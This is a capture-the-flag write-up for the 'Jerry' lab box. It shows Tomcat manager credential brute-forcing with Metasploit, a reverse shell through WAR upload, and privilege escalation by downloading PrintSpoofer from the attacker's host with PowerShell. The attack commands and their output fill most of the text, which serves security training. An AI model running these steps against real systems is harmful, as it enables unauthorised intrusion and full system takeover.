
# Box: Jerry

> Damiano Gubiani | 19/11/2025

export the machine IP address

```bash
export IP='10.10.10.95'
```

# Enumeration

running nmap scan for open ports on target

command:

```bash
sudo nmap -sS -sC -sV -oN nmap/scan --open -p - -T4 -vv $IP
```

output:

```
Nmap scan report for 10.10.10.95
Host is up, received echo-reply ttl 127 (0.15s latency).
Scanned at 2025-11-19 09:10:04 EST for 202s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON          VERSION
8080/tcp open  http    syn-ack ttl 127 Apache Tomcat/Coyote JSP engine 1.1
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
|_http-favicon: Apache Tomcat
```

checking the output we see that the server is running tomcat on port 8080 

# WebApp

when trying to go to the manager app part of the website we are presented a login page.

theres a module in metasploit that allow us to bruteforce said login page.

the module in question is the following:

> auxiliary/scanner/http/tomcat_mgr_login

command:

```bash
use auxiliary/scanner/http/tomcat_mgr_login
set RHOST 10.10.10.95
run
```

after letting it run for a while we found some valid credentials

> tomcat : s3cret

after founding this valid credentials we can leverage an upload vulnerability of tomcat to gain areverse shell.

we are gonna use the following module

> exploit/multi/http/tomcat_mgr_deploy

command:

```bash
use exploit/multi/http/tomcat_mgr_upload
set RHOST 10.10.10.95
set RPORT 8080
set lhost tun0
set HttpPassword s3cret
set HttpUsername tomcat
run
```

after running the exploit we got a callback on our kali machine

# Privilege escaletion

lets check our privilage on the machine

command:

```powershell
whoami /priv
```

output:

```
Privilege Name                  Description                               State   
=============================== ========================================= ========
SeAssignPrimaryTokenPrivilege   Replace a process level token             Disabled
SeLockMemoryPrivilege           Lock pages in memory                      Enabled 
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeTcbPrivilege                  Act as part of the operating system       Enabled 
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Enabled 
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Enabled 
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Enabled 
SeCreatePagefilePrivilege       Create a pagefile                         Enabled 
SeCreatePermanentPrivilege      Create permanent shared objects           Enabled 
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeAuditPrivilege                Generate security audits                  Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Enabled 
SeTimeZonePrivilege             Change the time zone                      Enabled 
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Enabled 
```

we are going to run the printspoofer on the target to gain a nt system shell

first off we need to upload the binaries via python simple http web server

start the web server

```bash
python3 -m http.server 80
```

than we download it on the victim

command:

```powershell
powershell -c "iwr -uri http://10.10.14.5/PrintSpoofer64.exe -outfile print.exe"
```

than we start the binary on the target 

command

```bash
.\print.exe -i
```

and if we run an whoami command we get the nt system user



